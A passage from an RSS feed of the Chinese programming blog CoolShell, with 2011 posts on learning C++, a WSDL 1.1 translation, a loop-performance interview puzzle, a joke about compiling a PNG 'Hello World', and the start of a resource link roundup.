<strong>面向对象设计</strong> 。虽然<a title="面向对象是个骗局？！" href="https://coolshell.cn/articles/3036.html" target="_blank">面向对象可能是个骗局</a>。但是我觉得面向对象设计中的一些实践非常的不错，比如，单一原则，依赖倒置原则，等等，都非常地经典。《<a href="http://product.china-pub.com/25961" target="_blank">设计模式</a>》必需一读，《<a href="http://product.china-pub.com/47106" target="_blank">面向对象的分析和设计</a>》可以一读。<strong>但不可以设计模式为中心来编程，而应该是用设计模式来解藕</strong>。</li>
</ul>
<ul>
<li>
<strong>类库学习</strong>。看看MFC是怎么封装Windows API的，看看ACE是怎么面向对象的，看看boost是怎么玩面向对象的，看看CPPUnit又是怎么设计的。当然，<a title="JDK里的设计模式" href="https://coolshell.cn/articles/3320.html" target="_blank">Java的JDK中有太多的设计模式</a>，可以参考。</li>
</ul>
<p>希望没有吓到大家，并欢迎大家补充。</p>
<p><em><strong>—————更新 2011/03/30 19:20————</strong></em></p>
<p>更新几个观点：</p>
<ul>
<li>1）我不擅长写书评，所以推荐的这些书可能会让你有点看点没有感觉，你可以上豆瓣或是China-pub上看看书评。</li>
<li>2）C++有很多奇淫技巧，有的很BT，包括虚函数表，也许会有人觉得有点没意思，但我觉得很有意思，一方面可以了解一门语言的实现细节，另一方面可以开阔思路。我从学习这些知识中受益很多。</li>
<li>3）上述是我的个人的学习历程，我觉得对我很有效，所以是经验之谈。</li>
<li>4）这类的文章在网上有很多很多，我不是第一个写这样的文章，我也不是写得最好的，我并不希望用长篇大论来谈论什么。只是想给大家了解一下大概的学习样子。毕竟，C++博大精深，任何一篇文章都无法说好。不如就简单一些。</li>
</ul>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12012.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_title">State Threads 回调终结者</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11466.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11466.html" class="wp_rp_title">C语言的整型溢出问题</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4119" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="b73fa951ef">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>48</strong> 人打了分，平均分： <strong>4.48</strong> )<br><span class="post-ratings-text" id="ratings_4119_text"></span><meta itemprop="name" content="如何学好C++语言">
<meta itemprop="headline" content="如何学好C++语言">
<meta itemprop="description" content="昨天写了一篇如何学好C语言，就有人回复问我如何学好C++，所以，我把我个人的一些学习经验写在这里，希望对大家有用。首先，因为如何学好C语言中谈到了算法和系统，所以这里就只谈C++语言。

	C++是最难的语言。这个世界上最难的编程语言可能非C++莫属了。你千万不要以为几天就可以学好C++，C++的学习曲线是相当BT的，你可以看看这篇文章。C++是一门很自由的语言，自由到了有点BT和恐怖的地步。...">
<meta itemprop="datePublished" content="2011-03-30T08:50:17+08:00">
<meta itemprop="dateModified" content="2014-12-04T10:08:43+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4119.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4119.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.48">
<meta itemprop="ratingCount" content="48">
</div>
</div>
<div id="post-ratings-4119-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-30T08:50:17+08:00</pubDate>
<guid>https://coolshell.cn/articles/4119.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ WSDL 1.1 中文规范 ]]></title>
<link>https://coolshell.cn/articles/4131.html</link>
<content><![CDATA[ 
<p>WSDL规范目前最新的版本是2.0 ，但是目前大部分还是按1.1的版本进行使用，而且1.1的内容看上去比2.0也简单些，所以我就翻译了这个版本。</p>
<p>作为一种《<a title="那些炒作过度的技术和概念" href="https://coolshell.cn/articles/3609.html">炒作过度的技术和概念</a>》的一类，WEB Service的确是太过重量级，对于小型的应用，还是因该避免去使用xml和SOAP这些技术。但是在企业级的应用，WEB Service已经开始成为了一种常态，所以对其有一定了解或多或少都是有一些好处的。</p>
<p>当然，通过读规范来学习一门技术的方法，从来都不是一种好的学习方法，规范只是配合你学习的参考。而且WSDL1.1规范中笔误太多，笔者就发现了两处，都一一做了修正。</p>
<p>原文的地址在：<a href="https://www.w3.org/TR/wsdl">http://www.w3.org/TR/wsdl</a> ，学习WSDL，需要有一定XML，XML Schema XSD，SOAP的相关知识，请在阅读时特别注意。</p>
<p>另外WSDL1.1是一个宽泛的规范，所有的语法都以非正式的形式出现，而且为了满足WEB Service 扩展性的需求，也不可能定义出详尽的语法，请在阅读时特别注意。</p>
<p>我的翻译版本以word形式提供，请要转载的同学们别把酷壳logo去掉的，转载请注明出处。</p>
<p>由于个人水平有限，翻译难免出现错误。还请读者海涵。</p>
<p>下载：<a href="https://coolshell.cn/wp-content/uploads/2011/03/WSDL-%E4%B8%AD%E6%96%87%E8%A7%84%E8%8C%831.1.doc">WSDL 中文规范1.1</a></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/1457.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1457.html" class="wp_rp_title">微软在从Google赢取搜索引擎市场份额</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11973.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11973.html" class="wp_rp_title">bash代码注入的安全漏洞</a>
</li>
<li>
<a href="https://coolshell.cn/articles/648.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/648.html" class="wp_rp_title">22个不错的CSS技术</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6424.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6424.html" class="wp_rp_title">Hash Collision DoS 问题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1644.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1644.html" class="wp_rp_title">装完Ubuntu 9.10后要干的事</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8275.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8275.html" class="wp_rp_title">对九个超级程序员的采访</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4131" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="7ff5f47352">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>8</strong> 人打了分，平均分： <strong>3.00</strong> )<br><span class="post-ratings-text" id="ratings_4131_text"></span><meta itemprop="name" content="WSDL 1.1 中文规范">
<meta itemprop="headline" content="WSDL 1.1 中文规范">
<meta itemprop="description" content="WSDL规范目前最新的版本是2.0 ，但是目前大部分还是按1.1的版本进行使用，而且1.1的内容看上去比2.0也简单些，所以我就翻译了这个版本。

作为一种《炒作过度的技术和概念》的一类，WEB Service的确是太过重量级，对于小型的应用，还是因该避免去使用xml和SOAP这些技术。但是在企业级的应用，WEB Service已经开始成为了一种常态，所以对其有一定了解或多或少都是有一些好处的...">
<meta itemprop="datePublished" content="2011-04-01T08:30:21+08:00">
<meta itemprop="dateModified" content="2011-03-31T20:45:01+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4131.html">
<meta itemprop="author" content="Neo">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4131.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3">
<meta itemprop="ratingCount" content="8">
</div>
</div>
<div id="post-ratings-4131-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-01T08:30:21+08:00</pubDate>
<guid>https://coolshell.cn/articles/4131.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 又一个有趣的面试题 ]]></title>
<link>https://coolshell.cn/articles/4162.html</link>
<content><![CDATA[ 
<p>大家还记得前些天的那个<a title="“火柴棍式”程序员面试题" href="https://coolshell.cn/articles/3961.html" target="_blank">火柴棍式的面试题</a>吗？很有趣吧。下面是我今天在StackExchange上看到的一个<a href="https://programmers.stackexchange.com/questions/64132/interesting-interview-question" target="_blank">有趣的面试题</a>。大家不妨一起来思考一下。问题如下——</p>
<p>有两个相同功能代码如下，<strong>请在在A，B，C是什么的情况下，请给出三个原因case 1比case 2快，还有三个原因case 2会比case 1要执行的快。</strong>（不考虑编译器优化）</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">for (i=0; i&lt;N; ++i){
    A;
    B;
    C;
}</pre>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">for (i=0; i&lt;N; ++i){
    A;
}
for (i=0; i&lt;N; ++i){
    B;
}
for (i=0; i&lt;N; ++i){
    C;
}</pre>
<p>我的第一个反应是——</p>
<p><span id="more-4162"></span></p>
<ul>
<li>case1 要快一些，因为只有一个i++的i&lt;N的操作，而case 2却有三个，这在点上，case 1就比case 2要快。</li>
<li>case2如果要快的话，有一个原因是，A, B, C其中一个需要去先获得一个资源（比如一个锁），在case1下，每次都要去拿这个资源，而case2下，只需要拿一次然后。但这个可能是不对的，因为我无法想出一个相同的语句块放在case 1中会和放在case 2中有差别。（不过可能比较接近了）</li>
</ul>
<p>继续思考：这个题有点像是“<strong>同步和异步</strong>”的问题，case 1是同步，case 2是异步，所以，异步快于同步，也许可以从这个方向出发，写出A, B, C的语句块。</p>
<p>不过，其要三个原因啊。<strong>各位，你们有想法吗</strong>？</p>
<p><strong>—-更新 1—-</strong></p>
<p>刚才在twitter上与人讨论，发现又有一种情况，case 2要比case 1要快。比如，A, B, C分别访问是不同的内存块（数组），那么case 1就得在不同的内存块上来回切换寻址，而case2则可以连续地访问内存块。访问连续的内存效率要高。尤其是三块大内存。</p>
<p><strong>—-更新 2—</strong></p>
<p>正如本贴评论中所说的，CPU的cache也是其中一个因素。大家对底层知识了解的都很不错啊。赞一个。</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/7965.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7965.html" class="wp_rp_title">一个fork的面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3961.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3961.html" class="wp_rp_title">“火柴棍式”程序员面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3738.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3738.html" class="wp_rp_title">打印质数的各种算法</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3445.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3445.html" class="wp_rp_title">输出从1到1000的数</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10478.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10478.html" class="wp_rp_title">C++面试中string类的一种正确写法</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4162" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="c0de007e4b">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>16</strong> 人打了分，平均分： <strong>4.00</strong> )<br><span class="post-ratings-text" id="ratings_4162_text"></span><meta itemprop="name" content="又一个有趣的面试题">
<meta itemprop="headline" content="又一个有趣的面试题">
<meta itemprop="description" content='大家还记得前些天的那个火柴棍式的面试题吗？很有趣吧。下面是我今天在StackExchange上看到的一个有趣的面试题。大家不妨一起来思考一下。问题如下——

有两个相同功能代码如下，请在在A，B，C是什么的情况下，请给出三个原因case 1比case 2快，还有三个原因case 2会比case 1要执行的快。（不考虑编译器优化）

[c title="case 1"]
for (i=0;...'>
<meta itemprop="datePublished" content="2011-04-02T11:22:03+08:00">
<meta itemprop="dateModified" content="2011-04-11T08:02:47+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4162.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4162.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4">
<meta itemprop="ratingCount" content="16">
</div>
</div>
<div id="post-ratings-4162-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-02T11:22:03+08:00</pubDate>
<guid>https://coolshell.cn/articles/4162.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 我有一个Hello World的C++程序编译不过 ]]></title>
<link>https://coolshell.cn/articles/4170.html</link>
<content><![CDATA[ 
<p>在StackOverflow上有这样<a href="https://stackoverflow.com/questions/5508110/why-is-this-program-erroneously-rejected-by-three-c-compilers" target="_blank">一个贴子</a>，楼主说，我有下面这样的一个C++程序，为什么编译不通过啊。其让我想起了以前的这两个帖子《<a title="编程真难啊" href="https://coolshell.cn/articles/1391.html" target="_blank">编程真难啊</a>》和《<a title="给我一个序列号" href="https://coolshell.cn/articles/1693.html" target="_blank">给我一个序列号</a>》。<strong>仅以此篇文章祝大家假期快乐吧</strong>。</p>
<figure style="width: 535px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption class="wp-caption-text">hello world 程序</figcaption></figure>
<p style="text-align: left;">楼主还给出了相关的编译出错的信息（相信你一看就明白问题在哪里了，你应该还会发出一声“靠”！！！）</p>
<p>先是用Visual C++ 2010编译</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">c:\dev&gt;cl /nologo helloworld.png
cl : Command line warning D9024 : unrecognized source file type 'helloworld.png', object file assumed
helloworld.png : fatal error LNK1107: invalid or corrupt file: cannot read at 0x5172</pre>
<p>再用G++ 4.5.2编译</p>
<p><span id="more-4170"></span></p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">c:\dev&gt;g++ helloworld.png
helloworld.png: file not recognized: File format not recognized
collect2: ld returned 1 exit status</pre>
<p>再用clang编译</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">c:\dev&gt;clang++ helloworld.png
helloworld.png: file not recognized: File format not recognized
collect2: ld returned 1 exit status
clang++: error: linker (via gcc) command failed with exit code 1 (use -v to see invocation)</pre>
<p style="text-align: left;">不过，最强大的，有人居然给出了一个fix，靠！<br>
（下面的图片是一个4M大的gif动画，演示了整个过程，下载可能需要一定的时间。）</p>
<figure style="width: 570px" class="wp-caption aligncenter"><a href="https://i.imgur.com/QlGpd.gif"><img alt="image placeholder" ></a><figcaption class="wp-caption-text">hello world 的解决方案 （图片有点大4M，请耐心等待下载）</figcaption></figure>
<p>真是BT啊，呵呵。<strong>仅以此篇文章祝大家假期快乐吧</strong>。</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12012.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_title">State Threads 回调终结者</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11466.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11466.html" class="wp_rp_title">C语言的整型溢出问题</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4170" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="8977fb4d99">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>22</strong> 人打了分，平均分： <strong>4.27</strong> )<br><span class="post-ratings-text" id="ratings_4170_text"></span><meta itemprop="name" content="我有一个Hello World的C++程序编译不过">
<meta itemprop="headline" content="我有一个Hello World的C++程序编译不过">
<meta itemprop="description" content="在StackOverflow上有这样一个贴子，楼主说，我有下面这样的一个C++程序，为什么编译不通过啊。其让我想起了以前的这两个帖子《编程真难啊》和《给我一个序列号》。仅以此篇文章祝大家假期快乐吧。


楼主还给出了相关的编译出错的信息（相信你一看就明白问题在哪里了，你应该还会发出一声“靠”！！！）
先是用Visual C++ 2010编译

[shell]c:\dev&gt;cl /nol...">
<meta itemprop="datePublished" content="2011-04-02T14:33:57+08:00">
<meta itemprop="dateModified" content="2011-09-20T22:15:14+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4170.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4170.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.27">
<meta itemprop="ratingCount" content="22">
</div>
</div>
<div id="post-ratings-4170-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-02T14:33:57+08:00</pubDate>
<guid>https://coolshell.cn/articles/4170.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一些有意思的文章和资源 ]]></title>
<link>https://coolshell.cn/articles/4220.html</link>
<content><![CDATA[ 
<p>又到了向大家介绍一些最近我在网上发现的有价值的东西的时候了。（下面的链接中很多都被墙）</p>
<ul>
<li>以前向大家介绍过《<a title="一些重要的算法" href="https://coolshell.cn/articles/2583.html" target="_blank">一些重要的算法</a>》和《<a title="算法和数据结构词典" href="https://coolshell.cn/articles/1499.html" target="_blank">算法和数据结构词典</a>》，不过，你知道有些什么样比较奇怪的数据结构吗？wikipedia上的这个词条可以让你看看<a href="https://en.wikipedia.org/wiki/List_of_data_structures" target="_blank">各种不同的数据结构</a>。比如：<a rel="nofollow" href="https://en.wikipedia.org/wiki/Skip_list">Skip lists</a>， <a rel="nofollow" href="https://en.wikipedia.org/wiki/Bloom_filter">Bloom filters</a>，或是什么<a rel="nofollow" href="https://en.wikipedia.org/wiki/Dancing_Links">Dancing links</a>。你也许会像一个以“<a title="如何学好C++语言" href="https://coolshell.cn/articles/4119.html" target="_blank">如何学好C++</a>”中的朋友们所说的，不削于这种所谓的“奇技淫巧”，甚至觉得这太根本不实用。其实，这些东西还是有用的，至少对你开阔思路，活动编程思维能力很有意义。</li>
</ul>
<ul>
<li>本站的关于<a href="https://coolshell.cn/tag/%e6%8e%92%e5%ba%8f" target="_blank">排序的文章</a>有很多，对于排序算法来说，其受到要排序的个数和数据的杂乱程度的影响，我们知道比较稳定的排序算法是快速排序和归并排序，归并排序对于大量的数据排序效果是非常好的，尤其是我们可以进行并行的排序。这里有一个并行归并排序的算法的源代码，你可以参考一下 – “<a href="https://dzmitryhuba.blogspot.com/2010/10/parallel-merge-sort.html" target="_blank">Parallel Merge Sort</a>”。</li>
</ul>
<ul>
<li>说到“奇技淫巧”和算法，这里有一个文章向你展示了C语言中使用位操作可能完成的各种算法，很有意思。请参看 – “<a href="http://aggregate.ee.engr.uky.edu/MAGIC/" target="_blank">The Aggregate Magic Algorithms</a>”</li>
</ul>
<ul>
<li>这里有篇文章教你如何取得一个<a href="http://www.productivity501.com/harvard-masters-degree/6463/" target="_blank">在线的哈佛大学的硕士学位</a>，文章中说了一些相关的事宜，包括一些收费情况，并且展示了一张文凭。这里有一个网页说明了<a href="http://blog.markwshead.com/911/harvard-online-masters-degree-in-software-engineering/" target="_blank">哈佛软件工程学位</a>（Software Engineering）的所需要学习的科目，比如：Java和分布式计算，分布式/企业级计算，设计模式和Java，通讯协议，高级数据网络，Web开发，计算理论，Perl实践，Unix系统编程……我不知道我们的国家各个大学的硕士在学什么，因为我没有读过硕士，但好像现在的计算机研究生只是导师用来挣钱的免费资源，而且，实在不知道研究生在校研究什么。不管怎么样，从这看来，我们的大学好像并没有教给学生计算机的技术。比如在“<a title="如何学好C语言" href="https://coolshell.cn/articles/4102.html" target="_blank">如何学好C语言</a>”和“<a title="如何学好C++语言" href="https://coolshell.cn/articles/4119.html" target="_blank">如何学好C++语言</a>”中我提到的那些书，那些才是大学里应该学的。我国的教育还真不是一般的落后，不过你不妨试试哈佛的在线学位。</li>
</ul>
<p><span id="more-4220"></span></p>
<ul>
<li>关于网上的电子书，以前本站介绍过一 个<a title="免费电子书列表" href="https://coolshell.cn/articles/2775.html" target="_blank">免费电子书列表</a>，这里再推荐一个网站，上面有很多很多很不错的计算机科学方面的电子书，当然，都是英文的。<a href="http://www.sciencebooksonline.info/computer-science.html" target="_blank">http://www.sciencebooksonline.info/computer-science.html</a>。我知道你对英文发憷，但是，朋友，你一定要学好英文啊，这不仅仅只是为了学好计算机啊。</li>
</ul>
<ul>
<li>还记得本站的“<a title="64位平台C/C++开发注意事项" href="https://coolshell.cn/articles/3512.html" target="_blank">64位平台开发的注意事项</a>”吗？Intel Software Network上有这样一篇文章其收集了一些在64位平台上经常出现的错的，图文并茂的，相当的不错，强力推荐给大家 – “<a href="https://software.intel.com/en-us/articles/collection-of-examples-of-64-bit-errors-in-real-programs/" target="_blank">A Collection of Examples of 64-bit Errors in Real Programs</a>”</li>
</ul>
<ul>
<li>你爱好汇编语言吗？如果你是汇编的痴迷者，那么mac.com上的<a href="http://homepage.mac.com/randyhyde/webster.cs.ucr.edu/index.html">这个列表</a>对你很有意义了。里面的相关文章非常不错哦。而这里有一个<a href="http://www.duntemann.com/assembly.html" target="_blank">Step by Step的x86汇编编程教程</a>。</li>
</ul>
<ul>
<li>还记得那篇“UI和UX的差别”吗？呵呵。这里有一个网站，给了你30+条UX用户体验的建议，我觉得非常不错，转给大家<a href="http://uxmyths.com/">http://uxmyths.com/</a>
</li>
</ul>
<ul>
<li>想在Visual Studio 2010下编写Python吗？那么，向你介绍这个微软官方的插件<a href="https://pytools.codeplex.com/" target="_blank">Python  Tools for Visual Studio</a>。你还可以在VS中调试你的Python代码。挺不错的。</li>
</ul>
<ul>
<li>在VS里开发Python，那么就可以使用Eclipse编写Android程序，这里有一篇教程教你 – <a href="http://www.smashingmagazine.com/2011/03/28/get-started-developing-for-android-with-eclipse-reloaded/" target="_blank">Get Started Developing For Android With Eclipse, Reloaded</a>
</li>
</ul>
<ul>
<li>说到了Android，必然要提一提iOS。想学iOS编程吗？这里有一篇教程很不错，如果你是一个什么也不懂的初学者，你不妨看看这篇文章“<a href="http://designthencode.com/scratch/" target="_blank">Build iOS App from Scrach</a>”</li>
</ul>
<ul>
<li>查JDK是不是有点不好查？这里有一个网站可以方便地查找JDK和Android的API – <a href="http://www.kiwidoc.com/" target="_blank">http://www.kiwidoc.com</a>，我觉得很不错哦。</li>
</ul>
<ul>
<li>不知道你是不是一个怀旧的人，你是否还记得以前用C语言开发Web的时光呢？我记得我97-98年的时候学过用C开发web应用，觉得挺难学的，我还没有完全搞懂，就出现了ASP，PHP……。这两天看到一篇 <a href="https://www.tutorialspoint.com/cplusplus/cpp_web_programming.htm" target="_blank">C++ Web Programming</a>，讲得真是很系统啊，从处理HTTP Header，到处理表单和上传文件。看完后，感觉有点坐着时光机器回到大学时的感觉。呵呵。</li>
</ul>
<ul>
